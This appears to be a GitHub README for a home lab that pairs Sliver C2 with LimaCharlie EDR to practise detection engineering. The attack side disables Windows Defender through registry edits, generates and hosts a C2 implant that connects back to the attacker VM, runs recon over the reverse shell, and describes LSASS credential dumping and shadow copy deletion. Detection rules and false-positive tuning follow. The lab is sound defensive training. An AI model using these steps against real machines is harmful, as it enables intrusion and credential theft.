<h1>LimaCharlie EDR & Sliver C2 Lab</h1>

<h2>Description</h2>
This project integrates LimaCharlie EDR with Sliver C2 to simulate real-world red team vs. blue team scenarios. Sliver C2 is used to emulate adversary behavior by deploying implants and executing commands on a test Windows machine, while LimaCharlie serves as the EDR solution to monitor and analyze endpoint activity. The goal is to generate telemetry from malicious actions (like process creation and network connections) and then detect and respond to them using LimaCharlie’s hunting rules, detection logic, and automation tools. This setup helps demonstrate EDR capabilities and test detection engineering in a controlled environment.
<br />

<h2>Languages and Utilities Used</h2>

- <b>Powershell</b> 
- <b>CMD</b>
- <b>Oracle VM VirtualBox</b>
- <b>LimaCharlie EDR</b>
- <b>Sliver C2</b>
- <b>Shell</b>

<h2>Environments Used </h2>

- <b>Windows 11</b> (23H2)
- <b>Ubuntu Server</b>

<h2>Lab walk-through:</h2>

<p align="left">
<h3>Windows 11 VM Setup (Victim)</h3>

1. Download and install a Windows 11 VM using Oracle VirtualBox. <br/>
2. Start the Windows VM and disable Windows Defender permanently under Windows Settings. Guide for reference:  
<a href="https://windowsreport.com/disable-windows-defender-windows-11/">Disable Defender - WindowsReport</a><br/>

<img src="https://github.com/user-attachments/assets/1f94c45e-e1ac-48db-a118-2cfb7cc0f008" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/8f665669-653d-49b9-966c-d6c817caf100" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

3. Open the Windows Registry Editor and navigate to the following paths. For each, set the `Start` value to `4` to fully disable the associated Defender services: <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WDNisDrv <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc <br/>
- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter <br/>

4. Open command prompt and run the following command to download and install Sysmon. <br/>
<img src="https://github.com/user-attachments/assets/4033bf00-2047-4c1f-bf61-6bc09e61fd35" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. Extract the package and run the following commands through command prompt:

<pre>#Extracts the Sysmon.zip archive to the Sysmon folder in Temp 
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon</pre>
 
<pre>#Downloads the Sysmon configuration file from GitHub to the Sysmon folder
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml</pre>

<pre>#Installs and configures Sysmon using the downloaded config file, automatically accepting the EULA 
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i  
</pre><br />

6. Confirm the Sysmon service is running. 
<img src="https://github.com/user-attachments/assets/a94035ef-b081-41cc-913e-50c613352ff8" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

7. Try running the Get-WinEvent command to generate logs.
<img src="https://github.com/user-attachments/assets/16374139-427f-4cbf-8369-6042d31cd0b2" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<h3>LimaCharlie Sensor Setup</h3>

1. **Within the Windows 11 VM**, create a LimaCharlie account at <a href="https://limacharlie.io">https://limacharlie.io</a> and create a new sensor for Windows. Tabs to select on the LimaCharlie website: Add sensors -> select Windows -> create new -> provide description as Lab VM -> select Create -> select Lab VM -> select the .exe file<br/>
<img src="https://github.com/user-attachments/assets/0200dfd9-9b45-48c7-a0b9-c67d8daa2ad8" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

2. Select “Windows” as the platform and download the sensor `.exe` file. <br/>
<img src="https://github.com/user-attachments/assets/45b58f13-f85e-43cd-a15a-f0d4dcfd01dd" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/f9571c0a-564b-4f50-8ba6-c4e0fec2930a" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

3. Transfer the sensor file to the Windows VM and run it with administrator privileges. <br/>
<img src="https://github.com/user-attachments/assets/a9a43e82-8c8e-4331-ab61-a8621a335e52" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

4. Input the sensor key provided from the LimaCharlie dashboard into the Windows VM to complete the installation via command prompt. Ensure `lc_sensor.exe` is added to the first part of the command.  <br/>
<img src="https://github.com/user-attachments/assets/abe8b123-fd05-4451-8d37-f5eb5f2e5d85" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/7699d942-7964-421b-9a33-0abcca18db2d" height="40%" width="40%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. In the LimaCharlie dashboard, create a new Artifact Collection Rule to collect Windows Event Logs (Sysmon). Use the pattern directive to collect all relevant logs for threat detection.
<img src="https://github.com/user-attachments/assets/c3fe28d8-5a7c-4e24-931d-40d9a6a74ebd" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/c87b5bef-a1ce-4027-97cb-15162deef4ae" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/8212087a-0577-41b8-a690-21b933d02261" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<h3>Ubuntu Server VM (Sliver C2 - Attacker)</h3>

1. Download and install a new Ubuntu Server VM using Oracle VirtualBox. <br/>
2. In VirtualBox settings, configure a port forwarding rule to allow SSH access to the Ubuntu VM from your host system using port 22. <br/>

<img src="https://github.com/user-attachments/assets/9cd691f6-a2ab-4d0e-aa92-0819fb4da99c" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

3. Open a terminal and install network utilities (if not present):
<pre>sudo apt install net-tools</pre><br/>

4. Test internet connectivity with: 
<pre>ping -c 2 [target_IP]</pre><br/>
<img src="https://github.com/user-attachments/assets/f7f0b634-61a8-41b8-b521-5404b9b9178f" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. Ensure SSH is enabled and running: 
<pre>sudo systemctl status ssh</pre><br/> 

6. From your local machine (or another VM), open a CMD window as admin and SSH into the Ubuntu server using the following command:
<pre>ssh [hostname@Ubuntu_VM_IP]</pre><br/>

<img src="https://github.com/user-attachments/assets/93b7637d-2029-4eb0-9822-aa72d8954c08" height="50%" width="60%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

8. Download and install Sliver C2 server by executing the following commands:
**This step is to simulate how an attacker would remote into a victim’s endpoint via SSH via open ports and install a C2 server in their machine**<br/>

<pre>wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server</pre><br/>
<pre>chmod +x /usr/local/bin/sliver-server</pre><br/>
<pre>sudo apt install -y mingw-w64</pre><br/>

<img src="https://github.com/user-attachments/assets/9e0ed3be-70a2-4014-a4a2-d6e9204d9fe1" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

8. Lastly, create a working directory for Sliver:
<pre>mkdir -p /opt/sliver</pre><br/><br/>

<h3>Payload Deployment and Initial Access (recommended to take a snapshot of the Windows VM before starting this step)</h3>

1. SSH back into the Ubuntu VM and launch the Sliver C2 server:
<pre>cd /opt/sliver && sliver-server</pre><br/>

<img src="https://github.com/user-attachments/assets/750352d8-6b51-47d6-9822-baca02e1c656" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

2. Generate a payload from the Sliver interface:
<pre>generate --http [Ubuntu_VM_IP] --save /opt/sliver/payload.exe</pre><br/>

<img src="https://github.com/user-attachments/assets/d26f5e7f-8f3b-4048-82a0-c72105458c24" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

3. Run the following command to starts an http server to host the payload:
<pre>#Calls a Python interpreter, runs a module as a script (-m), and uses a built-in Python module (part of the standard library) that starts a simple HTTP server (port 80 or 8080)
python3 -m http.server 80</pre><br />

<img src="https://github.com/user-attachments/assets/c575307d-7d6d-4328-8e24-cf400bbcd530" height="50%" width="50%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

4. From the Windows VM, open any browser and enter in the Ubuntu VM's IP address. Click on the file to execute the payload and establish a reverse shell.

<img src="https://github.com/user-attachments/assets/899bf897-df25-44c5-98af-7aa4001c799b" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. Notice the automatic command changes from the SSH session (Sliver C2).

<img src="https://github.com/user-attachments/assets/5bd7316f-6086-49d0-8b07-83f9cecf45da" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

6. From the Windows VM, open a CMD window and run the download payload file.

<img src="https://github.com/user-attachments/assets/da118414-0030-4bf0-9ea8-3f756a4cc8ff" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

7. Back on the Windows VM, notice the reverse shell session succesfully started. Run the sessions command to confirm any other running payload sessions.

<img src="https://github.com/user-attachments/assets/08c1d040-a8af-4614-bd75-f41bff2b9fd8" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/b0855928-2659-4e67-858a-d890b7ab56d6" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

8. Take note of the payload ID and enter it into the Sliver prompt to start an active payload session:
<pre>use [PayloadID]</pre><br />

<img src="https://github.com/user-attachments/assets/3b2b4295-b8c8-42d4-837c-c1b130876d59" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

9. With a live payload session, run some command to view telemetry data between the victim and attack VM machines (Notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red):

<pre>info #(basic info about session)</pre>
<pre>whoami #(user of the session)</pre>
<pre>getprivs #(privilages of the user)</pre>
<pre>pwd #(working directory)</pre>
<pre>netstat #(network connections on host i.e. windows)</pre>  
<pre>ps -T #(running processes on VM)</pre>
<br/><br/>

<h3>Investigating Telemetry in LimaCharlie</h3>

1. Open the LimaCharlie dashboard and navigate to the “Sensors” section. Select the sensor for the Windows VM.<br/>

2. Explore telemetry from multiple tabs:
- <b>Processes:</b> View active and unsigned processes. In our case, the C2 implant is not signed & also is active on the network. <br/>
<img src="https://github.com/user-attachments/assets/eddace7a-3dcb-41f9-ae9b-9e86af55fea5" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

- <b>Network:</b> In network section we see that the process "PRINTED_BANDANA" is communicating between the Ubuntu and Windows IP addresses. <br/>
<img src="https://github.com/user-attachments/assets/194e343a-5d69-4b14-8f76-a637d57b4e3f" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

- <b>File System:</b> Locate the dropped payload and run its hash through VirusTotal. Notice no hash is found for the suspicious file, which should raise some red flags. <br/>
<img src="https://github.com/user-attachments/assets/bd1af7b0-fef3-4aef-b3bc-8ea89f2b183d" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/fe2541c2-6105-4192-ac07-96ed800cab3d" height="40%" width="40%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />   

- <b>Timeline:</b> Look for suspicious behaviors such as `SENSITIVE_PROCESS_ACCESS`. <br/><br/>

<h3>Detecting Credential Dumping & Creating a D&R Rule</h3>

1. From the Sliver C2 session, simulate credential dumping by running `procdump` on LSASS (a critical Windows process responsible for user authentication, security policy enforcement, and credential management). <br/>
<img src="https://github.com/user-attachments/assets/900ce13a-e34c-4e65-8766-126164ba59e8" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />  

2. In the LimaCharlie Timeline, locate the detection labeled `SENSITIVE_PROCESS_ACCESS`. <br/>

3. Click the detection and choose “Create D&R Rule” to build a detection that flags similar activity in the future. <br/>
<img src="https://github.com/user-attachments/assets/cc52c89a-0e72-4cdb-936a-515581260416" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

4. Type in the following event commands under the "Detect" and "Response" sections:
<img src="https://github.com/user-attachments/assets/10dbf022-7188-4143-9b50-37f01cce3ff0" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. Test the rule by rerunning the same credential dumping command. Confirm the detection appears in the “Detections” section. <br/><br/>
<img src="https://github.com/user-attachments/assets/e430aed5-ece2-42f6-b2d1-0bdecf867993" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />  

<img src="https://github.com/user-attachments/assets/ed203cd7-c7cf-4885-94a2-29bbabb2701e" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

<h3>Detect and Block Malicious Behavior in LimaCharlie EDR</h3>

1. Use the Sliver C2 session to simulate shadow copy deletion via SSH. <br/>
<img src="https://github.com/user-attachments/assets/b9910326-1728-4c5d-a8aa-c4ffc7ac3e3f" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

<img src="https://github.com/user-attachments/assets/693769cf-faa6-4a3c-8e06-c325bcb8ed60" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

2. Search for the event in LimaCharlie’s Timeline view. The event will show `NEW_PROCESS` and it will include the "delete shadows" command. <br/>
<img src="https://github.com/user-attachments/assets/cd615230-9faa-4b03-8821-725ebaab8460" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

3. Create a detection rule to match the shadow copy deletion command and test it. <br/>
<img src="https://github.com/user-attachments/assets/3963553d-aa3a-4f16-8d5d-9d4888ff2c89" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

<img src="https://github.com/user-attachments/assets/b7d312bc-2e31-4fb5-b753-ae7f0ee0c4bb" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

5. Re-run the shadow deletion command to validate the response rule. Look under the "Detections" tab in LimaCharlie. <br/>
<img src="https://github.com/user-attachments/assets/dc63a0c4-b9d5-428b-815d-e0ed734c7f3b" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

6. Confirm that the attack is blocked and subsequent actions (e.g., `whoami`) fail. <br/><br/>
<img src="https://github.com/user-attachments/assets/ae80f1fb-9d1d-4ee7-814f-7e8ef8c577bf" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

<h3>Tuning False Positives</h3>
This detection rule flags all executions of `svchost.exe`, a common running service in Windows. These services perform crucial tasks on Windows like network communication, system maintenance, and more. <br/>

1. From the LimaCharlie Timeline, select one of the `NEW_PROCESS` events that shows a process using `svchost.exe`. <br/>

2. Create an event rule to suppress detections with the `svchost.exe` process. <br/>
<img src="https://github.com/user-attachments/assets/8f6cf47d-86a2-436e-abdc-5a7bf638bf9c" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

<img src="https://github.com/user-attachments/assets/934e67bd-31ed-4c0c-ae49-59b2afbcc5f0" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /> 

3. Create a second rule to detect False Positives. This rule will work in conjunction with first `svchost.exe` rule to suppress false positives. At most times a Windows system runs the svchost with `-k` argument which specifies its a shared process & bad actors most of the times don't use it also when svchost runs from system32 its legit.
<img src="https://github.com/user-attachments/assets/5e78511d-7364-4bc0-b584-59665e9f81d5" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

4. Add the following commands under the "Detect" section of the false positive rule and save the changes (it may take a few minutes to show under the "Detections" tab):
<img src="https://github.com/user-attachments/assets/05ffbea4-5d75-419b-b2d7-430316d653e9" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br />

5. Go back to LimaCharlie "Detections" tab and select the new false positive rule. Open the event and click "Mark False Positive". <br/>
<img src="https://github.com/user-attachments/assets/85734b79-994e-4d25-8a57-f6df1c50c63f" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /

6. Again in the "Detections" tab, wait a few minutes for the event to trigger any false positive from the newly created rule. Copy all information under the event script

7. From the LimaCharlie menu, go to the "Automations" tab. View the new false positive rule and select the "Target Detection" tab within the rule configurations:
<img src="https://github.com/user-attachments/assets/2ca6064c-ea1d-484d-81e0-19d3cfb3e21e" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /

8. Paste in the copied event under "Target Detection" and click "Test". Notice the events captured from the false positive rules. It captures all  <br/>
<img src="https://github.com/user-attachments/assets/80e3d9b5-775d-48af-8d42-eaebd199739a" height="80%" width="80%" alt="LimaCharlieEDR_Lab Steps"/> 
<br /><br /

The new detection rule can be used to block any "false positive" detections that have `SUSPICIOUS_SVCHOST` as the category name, file path as `system32`, and command line triggers with `svchost.exe`. <br/><br/>

<h3>Lessons Learned</h3>

- To run a payload session, always restart the Sliver HTTP listener after rebooting either VM.
- Ensure the payload file remains present, as Defender or other security controls may delete it even after being disabled.
- Keep snapshots of your VM in clean states to quickly revert and re-test payloads and detections. <br/>

</p>
